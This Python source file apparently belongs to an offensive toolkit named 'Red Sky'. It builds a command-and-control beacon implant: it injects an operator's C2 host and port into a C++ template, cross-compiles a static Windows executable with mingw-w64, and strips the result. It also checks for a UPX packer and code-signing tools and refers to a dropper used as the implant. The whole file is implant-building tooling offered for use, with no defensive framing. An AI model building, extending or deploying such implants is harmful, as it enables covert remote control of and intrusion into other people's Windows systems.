# language: Python, file: Program/payload/builder.py, target: Red Sky payload — builder
# Orchestrator. Picks templates, injects config (C2 host, AES key), invokes
# the C++ compiler (when we're building the beacon) or writes scripts.

import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR, DATA_DIR


C2_TEMPLATE = DATA_DIR / "c2_templates" / "beacon.cpp"


def _pick_compiler() -> str:
    """Return the path to a working C++ compiler that targets Windows."""
    for cc in ("x86_64-w64-mingw32-g++", "x86_64-w64-mingw32-gcc"):
        if shutil.which(cc):
            return cc
    return ""


def cmd_check() -> int:
    """Report what's available to build with."""
    print_info("toolchain check")
    print()

    cc = _pick_compiler()
    if cc:
        print_ok(f"mingw-w64: {cc}")
    else:
        print_err("mingw-w64 missing — sudo apt install mingw-w64")

    tools = {
        "x86_64-w64-mingw32-g++": "mingw C++ compiler",
        "x86_64-w64-mingw32-windres": "mingw resource compiler",
        "strip": "binary stripper",
        "upx": "UPX packer (optional)",
        "osslsigncode": "code signing (optional)",
    }
    for tool, desc in tools.items():
        path = shutil.which(tool)
        if path:
            print(f"  {ARTERY}▓{RESET} {BONE}{tool:<28}{RESET} {OK}OK{RESET}  {ASH}{desc}{RESET}")
        else:
            print(f"  {SCARLET}░{RESET} {BONE}{tool:<28}{RESET} {CLOT}missing{RESET}  {ASH}{desc}{RESET}")

    print()
    print_info("templates")
    tpl_dir = DATA_DIR / "c2_templates"
    if tpl_dir.exists():
        for p in tpl_dir.glob("*.cpp"):
            print(f"  {ARTERY}▓{RESET} {BONE}{p.name}{RESET}")
    else:
        print(f"  {CLOT}no templates — build 13 will create them{RESET}")
    return 0


def cmd_build_beacon(out_file: str = "", host: str = "", port: int = 443) -> int:
    """Build the C++ beacon. Placeholder until Build 13 ships the template."""
    print_info("building beacon")

    tpl_dir = DATA_DIR / "c2_templates"
    beacon = tpl_dir / "beacon.cpp"

    if not beacon.exists():
        print_warn(f"beacon template not yet present: {beacon}")
        print_info("the C++ beacon lands in Build 13 — nothing to compile yet")
        print_info("until then, use a dropper (redsky payload dropper) as the implant")
        return 0

    cc = _pick_compiler()
    if not cc:
        print_err("no mingw compiler — install with: sudo apt install mingw-w64")
        return 1

    if not host:
        cfg = load_config()
        host = cfg.get("c2.host") or "c2.example.tld"
        port = cfg.get("c2.port") or 443

    build_dir = OUTPUT_DIR / "build"
    build_dir.mkdir(parents=True, exist_ok=True)
    out = Path(out_file) if out_file else build_dir / "beacon.exe"

    # copy template to build dir
    src = build_dir / "beacon.cpp"
    shutil.copy2(beacon, src)

    # inject config into the template
    content = src.read_text()
    content = content.replace("{{C2_HOST}}", host)
    content = content.replace("{{C2_PORT}}", str(port))
    src.write_text(content)

    # compile
    cmd = [
        cc, "-O2", "-s", "-static", "-std=c++20",
        "-o", str(out), str(src),
        "-lws2_32", "-lwinhttp", "-lbcrypt", "-ladvapi32",
    ]
    print_info(f"compiling with {cc}")
    try:
        r = subprocess.run(cmd, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print_err(f"compilation failed:")
        print(e.stderr[-2000:])
        return 1

    if not out.exists():
        print_err("compilation produced no output")
        return 1

    size_kb = out.stat().st_size / 1024
    print_ok(f"beacon built: {out} ({size_kb:.1f} KB)")

    # optional strip
    if shutil.which("strip"):
        subprocess.run(["strip", str(out)], check=False)
        size_kb = out.stat().st_size / 1024
        print_ok(f"stripped: {size_kb:.1f} KB")

    return 0


def run_cli(args: List[str]) -> int:
    if not args:
        print_err("usage: redsky payload builder <check|beacon> [--out file] [--host H] [--port N]")
        return 2

    sub = args[0]
    if sub == "check":
        return cmd_check()
    if sub == "beacon":
        out_file = ""
        host = ""
        port = 443
        for i, a in enumerate(args):
            if a == "--out" and i + 1 < len(args):
                out_file = args[i + 1]
            if a == "--host" and i + 1 < len(args):
                host = args[i + 1]
            if a == "--port" and i + 1 < len(args):
                port = int(args[i + 1])
        return cmd_build_beacon(out_file, host, port)
    print_err(f"unknown builder action: {sub}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
